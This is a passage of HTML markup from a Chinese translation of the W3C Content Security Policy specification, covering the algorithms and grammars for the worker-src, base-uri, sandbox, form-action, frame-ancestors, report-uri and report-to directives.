                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配源列表</a> 在 <var>request</var>、此指令的 <a
                            data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑥">值</a> 和
                        <var>policy</var> 上的结果是 "<code>Does Not Match</code>"，返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="worker-src 后请求检查" data-level="6.2.2.2"
                id="worker-src-post-request"><span class="secno">6.2.2.2. </span><span class="content">
                    <code>worker-src</code> 后请求检查 </span><a class="self-link" href="#worker-src-post-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①⑦">后请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④⑨">请求</a> <var>request</var>、一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②④">响应</a>
                <var>response</var> 和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑥②">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>对 <var>request</var> 执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a>，结果赋值给
                        <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 指令是否应执行</a> 在
                        <var>name</var>、<code>worker-src</code> 和 <var>policy</var> 上的结果是 "<code>No</code>"，返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 响应是否匹配源列表</a> 在
                        <var>response</var>、<var>request</var>、此指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value④⑦">值</a> 和 <var>policy</var> 上的结果是
                        "<code>Does Not Match</code>"，返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h3 class="heading settled" data-level="6.3" id="directives-document"><span class="secno">6.3. </span><span
                    class="content">文档指令</span><a class="self-link" href="#directives-document"></a></h3>
            <p>以下指令管理适用于文档或工作者环境的属性。</p>
            <h4 class="heading settled" data-level="6.3.1" id="directive-base-uri"><span
                    class="secno">6.3.1.</span><span class="content"><code>base-uri</code></span><a class="self-link"
                    href="#directive-base-uri"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="base-uri">base-uri</dfn> 指令限制可以用于 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑤">URL</a></code>
                的范围，这些 URL 可以用于 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⓪">文档</a></code>
                的
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element①">base</a></code>
                元素中。该指令的名称和值的语法由以下 ABNF 描述：
            </p>
            <pre>directive-name  = "base-uri"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑥">serialized-source-list</a>
</pre>
            <p>以下算法在 HTML 的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url"
                    id="ref-for-set-the-frozen-base-url①">设置冻结的基本 URL</a> 算法中调用，以监控和执行此指令：</p>
            <h5 class="heading settled dfn-paneled algorithm" data-algorithm="Is base allowed for document?"
                data-dfn-type="dfn" data-export data-level="6.3.1.1" data-lt="Is base allowed for document?"
                id="allow-base-for-document"><span class="secno">6.3.1.1.</span><span class="content"><var>base</var>
                    是否允许用于 <var>document</var>？</span><a class="self-link" href="#allow-base-for-document"
                    id="ref-for-allow-base-for-document①"></a></h5>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑥">URL</a></code>
                <var>base</var> 和一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①①">文档</a></code>
                <var>document</var>，如果 <var>base</var> 可以用作
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element②">base</a></code>
                元素的
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href" id="ref-for-attr-base-href①">href</a></code>
                属性的值，则返回 "<code>Allowed</code>"，否则返回 "<code>Blocked</code>"：
            </p>
            <ol>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②⑧">对于每个</a> <var>policy</var>，属于 <var>document</var> 的 <a
                            data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object①①">全局对象</a> 的 <a data-link-type="dfn"
                            href="#global-object-csp-list" id="ref-for-global-object-csp-list①①">CSP 列表</a>：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>source list</var> 为 null。</p>
                        <li data-md>
                            <p>如果在 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-directive-set"
                                    id="ref-for-policy-directive-set①①">指令集</a> 中存在一个 <a data-link-type="dfn"
                                    href="#directives" id="ref-for-directives②③">指令</a>，其 <a data-link-type="dfn"
                                    href="#directive-name" id="ref-for-directive-name①⑥">名称</a> 为
                                "<code>base-uri</code>"，则将 <var>source list</var> 设置为该 <a data-link-type="dfn"
                                    href="#directives" id="ref-for-directives②④">指令</a> 的 <a data-link-type="dfn"
                                    href="#directive-value" id="ref-for-directive-value④⑧">值</a>。</p>
                        <li data-md>
                            <p>如果 <var>source list</var> 为 null，则跳到下一个 <var>policy</var>。</p>
                        <li data-md>
                            <p>如果在 <var>base</var>、<var>source list</var>、<var>policy</var> 的 <a data-link-type="dfn"
                                    href="#policy-self-origin" id="ref-for-policy-self-origin①">self-origin</a> 和
                                <code>0</code> 上执行 <a href="#match-url-to-source-list">§ 6.7.2.7 URL
                                    是否与源列表匹配（包括重定向计数）</a> 的结果为 "<code>不匹配</code>"：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>令 <var>violation</var> 为在 <var>document</var> 的 <a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                                            id="ref-for-global-object①②">全局对象</a>、<var>policy</var> 和 "<a
                                            data-link-type="dfn" href="#base-uri"
                                            id="ref-for-base-uri"><code>base-uri</code></a>" 上执行 <a
                                            href="#create-violation-for-global">§ 2.4.1 创建全局、策略和指令的违规对象</a> 的结果。</p>
                                <li data-md>
                                    <p>将 <var>violation</var> 的 <a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource①⑦">资源</a> 设置为 "<code>inline</code>"。</p>
                                <li data-md>
                                    <p>在 <var>violation</var> 上执行 <a href="#report-violation">§ 5.5 报告违规</a>。</p>
                                <li data-md>
                                    <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-disposition"
                                            id="ref-for-policy-disposition①⑦">处置</a> 为 "<code>强制执行</code>"，则返回
                                        "<code>Blocked</code>"。</p>
                            </ol>
                    </ol>
                    <p class="note" role="note"><span class="marker">注意：</span>我们与回退的基本 URL 进行比较，以便正确处理类似于 <a
                            data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document"
                            id="ref-for-an-iframe-srcdoc-document">被沙盒处理为不透明来源的 <code>srcdoc</code> <code>文档</code> 的
                            iframe</a> 之类的内容。</p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.3.2" id="directive-sandbox"><span class="secno">6.3.2.</span><span
                    class="content"><code>sandbox</code></span><a class="self-link" href="#directive-sandbox"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="sandbox">sandbox</dfn> 指令指定了一个 HTML
                沙盒策略，用户代理将对资源应用该策略，就像它被包含在具有
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element①">iframe</a></code>
                元素的
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" id="ref-for-attr-iframe-sandbox">sandbox</a></code>
                属性中一样。
            </p>
            <p>该指令的语法由以下 ABNF 语法描述，并有额外要求，即每个标记值必须是 HTML 规范中允许用于
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element②">iframe</a></code>
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" id="ref-for-attr-iframe-sandbox①">sandbox</a></code>
                属性的关键字之一<a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>。
            </p>
            <pre>directive-name  = "sandbox"
directive-value = "" / <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc9110#section-5.6.2" id="ref-for-section-5.6.2">token</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace③">required-ascii-whitespace</a> <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc9110#section-5.6.2" id="ref-for-section-5.6.2①">token</a> )
</pre>
            <p>该指令没有报告要求；当它通过 <a data-link-type="http-header" href="#header-content-security-policy-report-only"
                    id="ref-for-header-content-security-policy-report-only③"><code>Content-Security-Policy-Report-Only</code></a>
                头或在
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta①⓪">meta</a></code>
                元素内传递时，将被完全忽略。
            </p>
            <h5 class="heading settled algorithm" data-algorithm="sandbox Initialization" data-level="6.3.2.1"
                id="sandbox-init"><span class="secno">6.3.2.1.</span><span class="content"><code>sandbox</code>
                    初始化</span><a class="self-link" href="#sandbox-init"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-initialization"
                    id="ref-for-directive-initialization③">初始化</a> 算法负责检查工人是否根据其策略中存在的 <a data-link-type="dfn"
                    href="#sandbox" id="ref-for-sandbox①"><code>sandbox</code></a> 值被允许运行：</p>
            <p class="note" role="note"><span class="marker">注意：</span><a data-link-type="dfn" href="#sandbox"
                    id="ref-for-sandbox②">sandbox</a> 指令还负责通过 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags"
                    id="ref-for-csp-derived-sandboxing-flags①">CSP 派生的沙盒标志</a>调整 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①②">文档</a></code>
                的 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/browsers.html#active-sandboxing-flag-set"
                    id="ref-for-active-sandboxing-flag-set">活动沙盒标志集</a>。</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①③">文档</a></code>
                或 <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                    id="ref-for-global-object①③">全局对象</a> <var>context</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥③">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-disposition"
                            id="ref-for-policy-disposition①⑧">处置</a> 不是 "<code>强制执行</code>"，或者 <var>context</var> 不是
                        <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope②">WorkerGlobalScope</a></code>，则中止此算法。
                    </p>
                <li data-md>
                    <p>令 <var>sandboxing flag set</var> 为一个新的 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#sandboxing-flag-set"
                            id="ref-for-sandboxing-flag-set">沙盒标志集</a>。</p>
                <li data-md>
                    <p>使用该指令的 <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑨">值</a>
                        作为输入，<var>sandboxing flag set</var> 作为输出，执行 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive"
                            id="ref-for-parse-a-sandboxing-directive">解析沙盒指令</a>。</p>
                <li data-md>
                    <p>如果 <var>sandboxing flag set</var> 包含 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag"
                            id="ref-for-sandboxed-scripts-browsing-context-flag">沙盒脚本浏览上下文标志</a> 或 <a
                            data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag"
                            id="ref-for-sandboxed-origin-browsing-context-flag">沙盒来源浏览上下文标志</a>，则返回
                        "<code>Blocked</code>"。</p>
                    <p class="note" role="note"><span class="marker">注意：</span>如果我们允许工人被沙盒化为独特的来源，这可能需要更改，这是一个相当合理的做法。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h3 class="heading settled" data-level="6.4" id="directives-navigation"><span class="secno">6.4.</span><span
                    class="content"> 导航指令 </span><a class="self-link" href="#directives-navigation"></a></h3>
            <h4 class="heading settled" data-level="6.4.1" id="directive-form-action"><span
                    class="secno">6.4.1.</span><span class="content"><code>form-action</code></span><a class="self-link"
                    href="#directive-form-action"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="form-action">form-action</dfn>
                指令限制可以用作给定上下文中表单提交目标的 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑦">URL</a></code>。该指令的语法由以下
                ABNF 语法描述：</p>
            <pre class="abnf">directive-name  = "form-action"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑦">serialized-source-list</a>
</pre>
            <h5 class="heading settled algorithm" data-algorithm="form-action Pre-Navigation Check" data-level="6.4.1.1"
                id="form-action-pre-navigate"><span class="secno">6.4.1.1.</span><span
                    class="content"><code>form-action</code> 预导航检查</span><a class="self-link"
                    href="#form-action-pre-navigate"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤⓪">请求</a> <var>request</var>，一个字符串 <var>navigation
                    type</var>（"<code>form-submission</code>" 或 "<code>other</code>"），以及一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥④">策略</a>
                <var>policy</var>，如果表单提交违反了 <code>form-action</code> 指令的约束，则此算法返回 "<code>Blocked</code>"，否则返回
                "<code>Allowed</code>"。这构成了 <code>form-action</code> 指令的 <a data-link-type="dfn"
                    href="#directive-pre-navigation-check" id="ref-for-directive-pre-navigation-check①">预导航检查</a>：
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p class="assertion">断言：<var>policy</var> 在此算法中未使用。</p>
                <li data-md>
                    <p>如果 <var>navigation type</var> 是 "<code>form-submission</code>"：</p>
                    <ol>
                        <li data-md>
                            <p>如果在 <var>request</var>、此指令的 <a data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤⓪">值</a> 和 <var>policy</var> 上执行 <a
                                    href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 的结果是
                                "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。</p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.4.2" id="directive-frame-ancestors"><span
                    class="secno">6.4.2.</span><span class="content"><code>frame-ancestors</code></span><a
                    class="self-link" href="#directive-frame-ancestors"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="frame-ancestors">frame-ancestors</dfn>
                指令限制可以使用
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/obsolete.html#frame" id="ref-for-frame①">frame</a></code>、<code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element③">iframe</a></code>、<code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element④">object</a></code>
                或
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element②">embed</a></code>
                嵌入资源的 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑧">URL</a></code>。资源可以使用该指令避免许多用户界面伪装攻击<a
                    data-link-type="biblio" href="#biblio-uisecurity"
                    title="User Interface Security and the Visibility API">[UISECURITY]</a>，从而避免被嵌入到潜在的恶意上下文中的风险。
            </p>
            <p>该指令的语法由以下 ABNF 语法描述：</p>
            <pre>directive-name  = "frame-ancestors"
directive-value = <a data-link-type="grammar" href="#grammardef-ancestor-source-list" id="ref-for-grammardef-ancestor-source-list">ancestor-source-list</a>

<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-ancestor-source-list">ancestor-source-list</dfn> = ( <a data-link-type="grammar" href="#grammardef-ancestor-source" id="ref-for-grammardef-ancestor-source">ancestor-source</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace④">required-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-ancestor-source" id="ref-for-grammardef-ancestor-source①">ancestor-source</a>) ) / "<a data-link-type="grammar" href="#grammardef-none" id="ref-for-grammardef-none①">'none'</a>"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-ancestor-source">ancestor-source</dfn>      = <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source①">scheme-source</a> / <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source①">host-source</a> / "<a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑧">'self'</a>"
</pre>
            <p>当 <code>frame-ancestors</code> 指令包含在通过
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta①①">meta</a></code>
                元素声明的策略中时，必须忽略该指令。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span><code>frame-ancestors</code> 指令的语法类似于 <a
                    data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①①">来源列表</a>，但如果指定了
                <code>default-src</code> 指令的值，<code>frame-ancestors</code> 不会回退到该值。这意味着声明
                <code>default-src 'none'</code> 的策略仍然允许任何人嵌入该资源。
            </p>
            <h5 class="heading settled algorithm" data-algorithm="frame-ancestors Navigation Response Check"
                data-level="6.4.2.1" id="frame-ancestors-navigation-response"><span class="secno">6.4.2.1.</span><span
                    class="content"><code>frame-ancestors</code> 导航响应检查</span><a class="self-link"
                    href="#frame-ancestors-navigation-response"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤①">请求</a> <var>request</var>，一个字符串 <var>navigation
                    type</var>（"<code>form-submission</code>" 或 "<code>other</code>"），一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑤">响应</a>
                <var>navigation response</var>，一个 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#navigable"
                    id="ref-for-navigable③">可导航对象</a> <var>target</var>，一个字符串 <var>check
                    type</var>（"<code>source</code>" 或 "<code>response</code>"），以及一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑤">策略</a>
                <var>policy</var>，如果 <var>target</var> 的一个或多个祖先违反了响应中提供的 <code>frame-ancestors</code> 指令，则此算法返回
                "<code>Blocked</code>"，否则返回 "<code>Allowed</code>"。这构成了 <code>frame-ancestors</code> 指令的 <a
                    data-link-type="dfn" href="#directive-navigation-response-check"
                    id="ref-for-directive-navigation-response-check②">导航响应检查</a>：
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>如果 <var>navigation response</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-response-url"
                            id="ref-for-concept-response-url②">URL</a> <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#is-local" id="ref-for-is-local">是本地的</a>，返回
                        "<code>Allowed</code>"。</p>
                <li data-md>
                    <p class="assertion">断言：<var>request</var>、<var>navigation response</var> 和 <var>navigation
                            type</var> 在此算法的后续部分中不再使用，因为 <code>frame-ancestors</code> 仅与 <var>navigation response</var>
                        的 <a data-link-type="dfn" href="#frame-ancestors"
                            id="ref-for-frame-ancestors②">frame-ancestors</a> <a data-link-type="dfn" href="#directives"
                            id="ref-for-directives②⑤">指令</a>有关。</p>
                <li data-md>
                    <p>如果 <var>check type</var> 是 "<code>source</code>"，返回 "<code>Allowed</code>"。</p>
                    <p class="note" role="note"><span class="marker">注意：</span>'frame-ancestors' <a data-link-type="dfn"
                            href="#directives" id="ref-for-directives②⑥">指令</a>仅与 <var>target</var> <a
                            data-link-type="dfn" href="https://html.spec.whatwg.org/#navigable"
                            id="ref-for-navigable④">可导航对象</a> 相关，对 <var>request</var> 的上下文没有影响。</p>
                <li data-md>
                    <p>如果 <var>target</var> 不是 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable"
                            id="ref-for-child-navigable③">子可导航对象</a>，返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>令 <var>current</var> 为 <var>target</var>。</p>
                <li data-md>
                    <p>当 <var>current</var> 是 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable"
                            id="ref-for-child-navigable④">子可导航对象</a>时：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>document</var> 为 <var>current</var> 的 <a data-link-type="dfn"
                                    href="https://html.spec.whatwg.org/multipage/document-sequences.html#nav-container-document"
                                    id="ref-for-nav-container-document">容器文档</a>。</p>
                        <li data-md>
                            <p>令 <var>origin</var> 为在 <var>document</var> 的 <a data-link-type="dfn"
                                    href="https://dom.spec.whatwg.org/#concept-document-origin"
                                    id="ref-for-concept-document-origin">来源</a>上执行 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#concept-url-parser"
                                    id="ref-for-concept-url-parser①">URL 解析器</a> 的结果。</p>
                        <li data-md>
                            <p>如果在 <var>origin</var>、此指令的 <a data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤①">值</a>、<var>policy</var> 的 <a data-link-type="dfn"
                                    href="#policy-self-origin" id="ref-for-policy-self-origin②">自身来源</a> 和
                                <code>0</code> 上执行 <a href="#match-url-to-source-list">§ 6.7.2.7 URL
                                    是否匹配来源列表中的来源和重定向计数？</a> 的结果是 "<code>Does Not Match</code>"，则返回
                                "<code>Blocked</code>"。
                            </p>
                        <li data-md>
                            <p>将 <var>current</var> 设置为 <var>document</var> 的 <a data-link-type="dfn"
                                    href="https://html.spec.whatwg.org/multipage/document-sequences.html#node-navigable"
                                    id="ref-for-node-navigable">节点可导航对象</a>。</p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled" data-level="6.4.2.2" id="frame-ancestors-and-frame-options"><span
                    class="secno">6.4.2.2. </span><span class="content"> 与
                    <code><a data-link-type="http-header" href="https://html.spec.whatwg.org/multipage/document-lifecycle.html#x-frame-options" id="ref-for-x-frame-options">X-Frame-Options</a></code>
                    的关系</span><a class="self-link" href="#frame-ancestors-and-frame-options"></a></h5>
            <p>此指令与
                <code><a data-link-type="http-header" href="https://html.spec.whatwg.org/multipage/document-lifecycle.html#x-frame-options" id="ref-for-x-frame-options①">X-Frame-Options</a></code>
                HTTP 响应头类似。<code>'none'</code> 源表达式大致相当于该头的 <code>DENY</code>，而 <code>'self'</code> 则相当于该头的
                <code>SAMEORIGIN</code>。<a data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>
            </p>
            <p>为了实现向后兼容的部署，<a data-link-type="dfn" href="#frame-ancestors"
                    id="ref-for-frame-ancestors③"><code>frame-ancestors</code></a> 指令<em>废弃</em>了
                <code><a data-link-type="http-header" href="https://html.spec.whatwg.org/multipage/document-lifecycle.html#x-frame-options" id="ref-for-x-frame-options②">X-Frame-Options</a></code>
                头。如果资源的 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑥⑥">策略</a> 中包含一个名为 <a data-link-type="dfn"
                    href="#frame-ancestors" id="ref-for-frame-ancestors④"><code>frame-ancestors</code></a> 的 <a
                    data-link-type="dfn" href="#directives" id="ref-for-directives②⑦">指令</a>，且其 <a data-link-type="dfn"
                    href="#policy-disposition" id="ref-for-policy-disposition①⑨">处置</a>为 "<code>enforce</code>"，则根据
                <cite>HTML</cite> 的处理模型，将忽略
                <code><a data-link-type="http-header" href="https://html.spec.whatwg.org/multipage/document-lifecycle.html#x-frame-options" id="ref-for-x-frame-options③">X-Frame-Options</a></code>
                头。
            </p>
            <h3 class="heading settled" data-level="6.5" id="directives-reporting"><span class="secno">6.5. </span><span
                    class="content"> 报告指令 </span><a class="self-link" href="#directives-reporting"></a></h3>
            <p>本文档中的各种算法通过创建一个 <a data-link-type="dfn" href="#violation" id="ref-for-violation②③">违规</a>对象，使用 <a
                    href="#create-violation-for-request">§ 2.4.2 为请求和策略创建违规对象</a> 或 <a
                    href="#create-violation-for-global">§ 2.4.1 为全局、策略和指令创建违规对象</a>，并将该对象传递给 <a
                    href="#report-violation">§ 5.5 报告违规</a> 来实现报告过程。</p>
            <h4 class="heading settled" data-level="6.5.1" id="directive-report-uri"><span class="secno">6.5.1.
                </span><span class="content"><code>report-uri</code></span><a class="self-link"
                    href="#directive-report-uri"></a></h4>
            <div class="note" role="note">
                注意：<a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri②"><code>report-uri</code></a>
                指令已被弃用。请改用 <a data-link-type="dfn" href="#report-to" id="ref-for-report-to③"><code>report-to</code></a>
                指令。如果存在后者指令，则会忽略此指令。为了确保向后兼容，我们建议同时指定两者，如下所示：
                <div class="example" id="example-0ac8d9c4">
                    <a class="self-link" href="#example-0ac8d9c4"></a>
                    <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑤">Content-Security-Policy</a>: ...; <a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri③">report-uri</a> https://endpoint.com; <a data-link-type="dfn" href="#report-to" id="ref-for-report-to④">report-to</a> groupname
</pre>
                </div>
            </div>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="report-uri"><code>report-uri</code></dfn>
                指令定义了一组端点，当特定行为被阻止时，<a data-link-type="dfn" href="#csp-violation-report"
                    id="ref-for-csp-violation-report②">CSP 违规报告</a>将被发送到这些端点。</p>
            <pre>directive-name  = "report-uri"
directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-4.1" id="ref-for-section-4.1">uri-reference</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace⑤">required-ascii-whitespace</a> <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-4.1" id="ref-for-section-4.1①">uri-reference</a> )

; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-4.1" id="ref-for-section-4.1②">uri-reference</a> 语法定义在 RFC 3986 的第 4.1 节。
</pre>
            <p>此指令本身没有任何效果，但仅在与其他指令结合使用时才具有意义。</p>
            <h4 class="heading settled" data-level="6.5.2" id="directive-report-to"><span class="secno">6.5.2.
                </span><span class="content"><code>report-to</code></span><a class="self-link"
                    href="#directive-report-to"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="report-to"><code>report-to</code></dfn>
                指令定义了应将违规报告发送到的 <a data-link-type="dfn" href="https://www.w3.org/TR/reporting-1/#endpoint"
                    id="ref-for-endpoint">报告端点</a><a data-link-type="biblio" href="#biblio-reporting"
                    title="Reporting API">[REPORTING]</a>。该指令的行为定义在 <a href="#report-violation">§ 5.5 报告违规</a>
                中。指令的名称和值由以下 ABNF 描述：</p>
            <pre>directive-name  = "report-to"
directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc9110#section-5.6.2" id="ref-for-section-5.6.2②">token</a>
</pre>
            <h3 class="heading settled" data-level="6.6" id="directives-elsewhere"><span class="secno">6.6. </span><span
                    class="content"> 其他文档中定义的指令 </span><a class="self-link" href="#directives-elsewhere"></a></h3>
            <p>本文档定义了一组核心指令，并为其他规范的模块化扩展建立了框架。在本文档生成时，以下稳定的文档扩展了 CSP：</p>
            <ul>
                <li data-md>
                    <p><a data-link-type="biblio" href="#biblio-mix" title="Mixed Content">[MIX]</a> 定义了
                        <code>block-all-mixed-content</code>
                    </p>
                <li data-md>
                    <p><a data-link-type="biblio" href="#biblio-upgrade-insecure-requests"
                            title="Upgrade Insecure Requests">[UPGRADE-INSECURE-REQUESTS]</a> 定义了
                        <code>upgrade-insecure-requests</code>
                    </p>
            </ul>
            <p>对 CSP 的扩展必须通过 <a data-link-type="biblio" href="#biblio-rfc7762"
                    title="Initial Assignment for the Content Security Policy Directives Registry">[RFC7762]</a>
                中概述的流程进行注册。特别是请注意该文档第 4.2 节中讨论的标准。</p>
            <p>新指令应使用 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①⑦">预请求检查</a>、<a data-link-type="dfn"
